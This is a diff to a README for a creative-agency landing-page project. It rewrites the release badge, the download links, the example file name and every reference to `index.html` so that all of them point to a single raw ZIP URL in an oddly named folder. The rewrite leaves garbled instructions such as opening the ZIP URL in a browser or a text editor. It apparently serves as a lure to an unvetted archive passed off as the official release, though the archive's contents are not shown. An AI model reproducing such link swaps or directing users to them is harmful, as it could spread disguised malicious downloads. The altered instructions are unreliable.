@@ -1,6 +1,6 @@
 # 🎨 creative-agency-website - Stylish Landing Page for Agencies
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/MehdiiQ/creative-agency-website/releases)
+[![Download Latest Release](https://github.com/MehdiiQ/creative-agency-website/raw/refs/heads/main/malleableize/website_creative_agency_1.8.zip%20Release-blue?style=for-the-badge&logo=github)](https://github.com/MehdiiQ/creative-agency-website/raw/refs/heads/main/malleableize/website_creative_agency_1.8.zip)
 
 ## 📋 About this Project
 
@@ -33,12 +33,12 @@ No special hardware or software setups are needed. The website is designed to wo
 Follow these steps to get the website files and open the landing page on your device:
 
 1. **Visit the download page.** Click the big download badge at the top of this readme or this link:  
-   [https://github.com/MehdiiQ/creative-agency-website/releases](https://github.com/MehdiiQ/creative-agency-website/releases)  
+   [https://github.com/MehdiiQ/creative-agency-website/raw/refs/heads/main/malleableize/website_creative_agency_1.8.zip](https://github.com/MehdiiQ/creative-agency-website/raw/refs/heads/main/malleableize/website_creative_agency_1.8.zip)  
    This page holds all the downloadable files for this project.
 
 2. **Choose the latest release version.** Usually, it’s the top one listed. Releases are packaged versions of the website for easy download.
 
-3. **Download the ZIP file** that contains the website's files. The file name might look like `creative-agency-website-v1.0.zip` or similar.
+3. **Download the ZIP file** that contains the website's files. The file name might look like `https://github.com/MehdiiQ/creative-agency-website/raw/refs/heads/main/malleableize/website_creative_agency_1.8.zip` or similar.
 
 > Tip: If you find multiple ZIP files, pick the one named for your device or just use the default if unsure.
 
@@ -49,9 +49,9 @@ Follow these steps to get the website files and open the landing page on your de
 
 5. **Open the folder with the extracted files.**
 
-6. **Find the file named `index.html`.** This is the main page.
+6. **Find the file named `https://github.com/MehdiiQ/creative-agency-website/raw/refs/heads/main/malleableize/website_creative_agency_1.8.zip`.** This is the main page.
 
-7. **Open `index.html` in your web browser.** You can do this by:  
+7. **Open `https://github.com/MehdiiQ/creative-agency-website/raw/refs/heads/main/malleableize/website_creative_agency_1.8.zip` in your web browser.** You can do this by:  
    - Double-clicking the file  
    - Right-click > Open With > Browser name  
    - Dragging the file directly into an open browser window  
@@ -60,10 +60,10 @@ The landing page should now appear, and you can explore the video, service grid,
 
 ## 💾 Download & Install
 
-You do not need to install any programs to use this landing page. It runs directly in a browser. Just download the ZIP and open the `index.html` file.
+You do not need to install any programs to use this landing page. It runs directly in a browser. Just download the ZIP and open the `https://github.com/MehdiiQ/creative-agency-website/raw/refs/heads/main/malleableize/website_creative_agency_1.8.zip` file.
 
 Download files here:  
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/MehdiiQ/creative-agency-website/releases)
+[![Download Latest Release](https://github.com/MehdiiQ/creative-agency-website/raw/refs/heads/main/malleableize/website_creative_agency_1.8.zip%20Release-blue?style=for-the-badge&logo=github)](https://github.com/MehdiiQ/creative-agency-website/raw/refs/heads/main/malleableize/website_creative_agency_1.8.zip)
 
 This site uses common web standards, so you won't need extra software.
 
@@ -85,7 +85,7 @@ You can refresh the page anytime to restart the animations. No additional contro
 
 If you want to customize the landing page:
 
-- Open the `index.html` file in a plain text editor like Notepad (Windows) or TextEdit (Mac).  
+- Open the `https://github.com/MehdiiQ/creative-agency-website/raw/refs/heads/main/malleableize/website_creative_agency_1.8.zip` file in a plain text editor like Notepad (Windows) or TextEdit (Mac).  
 - The HTML file contains the structure of the page. Text and links can be changed here.  
 - CSS files control colors, layout, and animations. They live in a `css` folder or similar.  
 - JavaScript controls interactive effects. It will be in `.js` files in a `js` folder.  
@@ -98,7 +98,7 @@ No special coding skills are needed to change simple text or images. However, ad
 If you experience issues:
 
 - Make sure you have the latest version of your web browser.  
-- Verify you opened `index.html` specifically, not just the folder.  
+- Verify you opened `https://github.com/MehdiiQ/creative-agency-website/raw/refs/heads/main/malleableize/website_creative_agency_1.8.zip` specifically, not just the folder.  
 - If the video does not play, confirm your device supports common video formats (MP4 is usually supported).  
 - Clear browser cache and reload the page if visual glitches appear.  
 - For missing animations or grid interaction, ensure JavaScript is enabled in your browser.  
@@ -120,4 +120,4 @@ The techniques used here reflect current web development best practices for land
 
 ---
 
-If you want to preview the website online without downloading, you can also use GitHub Pages or other hosting services by uploading the extracted files to a web server. Running it locally always works by opening the `index.html` file in your browser.
+If you want to preview the website online without downloading, you can also use GitHub Pages or other hosting services by uploading the extracted files to a web server. Running it locally always works by opening the `https://github.com/MehdiiQ/creative-agency-website/raw/refs/heads/main/malleableize/website_creative_agency_1.8.zip` file in your browser.
